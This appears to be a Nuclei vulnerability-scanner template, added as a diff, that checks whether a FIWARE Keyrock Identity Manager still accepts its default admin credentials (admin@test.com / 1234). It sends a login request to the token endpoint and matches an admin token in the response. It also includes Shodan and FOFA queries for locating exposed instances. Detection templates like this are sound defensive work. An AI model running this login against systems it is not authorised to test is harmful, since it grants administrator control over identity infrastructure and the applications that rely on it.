@@ -1,0 +1,52 @@
+id: fiware-keyrock-default-login
+
+info:
+  name: FIWARE Keyrock - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    FIWARE Keyrock Identity Manager seeds an administrator account with the email admin@test.com and the password 1234 when the database is created and the IDM_ADMIN_* variables are not changed. The official fiware/idm Docker image seeds the database by default. An attacker who logs in with these credentials gets an API token with administrator rights and can manage users, organizations, applications, OAuth2 credentials, roles and PEP proxies.
+  impact: |
+    An attacker with the default credentials gains administrator access to the identity provider and can create users, change roles and read or reset OAuth2 client secrets of the applications that rely on Keyrock.
+  remediation: |
+    Set IDM_ADMIN_EMAIL and IDM_ADMIN_PASS to custom values before the first start, or change the password of the default admin account.
+  reference:
+    - https://github.com/ging/fiware-idm/blob/FIWARE_8.4/README.md
+    - https://github.com/ging/fiware-idm/blob/FIWARE_8.4/seeders/201802190000-FillUserTable.js
+    - https://github.com/ging/fiware-idm/blob/FIWARE_8.4/lib/database.js
+    - https://github.com/ging/fiware-idm/blob/FIWARE_8.4/extras/docker/Dockerfile
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    max-request: 1
+    verified: true
+    vendor: fiware
+    product: keyrock
+    shodan-query: http.html:"IdM Keyrock"
+    fofa-query: body="IdM Keyrock"
+  tags: fiware,keyrock,idm,default-login
+
+variables:
+  username: "admin@test.com"
+  password: "1234"
+
+http:
+  - raw:
+      - |
+        POST /v1/auth/tokens HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"name":"{{username}}","password":"{{password}}"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "\"idm_authorization_config\"", "\"expires_at\"")'
+          - 'regex("\"methods\"\\s*:\\s*\\[\\s*\"password\"\\s*\\]", body)'
+          - 'regex("(?mi)^x-subject-token:\\s*[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\s*$", header)'
+          - 'contains(content_type, "json")'
+          - 'status_code == 201'
+        condition: and
